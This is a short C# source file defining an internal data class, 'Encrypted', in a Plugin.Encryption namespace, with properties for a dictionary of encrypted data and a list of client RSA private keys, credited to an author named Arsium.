using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin.Encryption
{
    internal class Encrypted
    {
        public Dictionary<string, string> encryptedData { get; set; }
        public List<string> clientRSAPrivate { get; set; }
    }
}
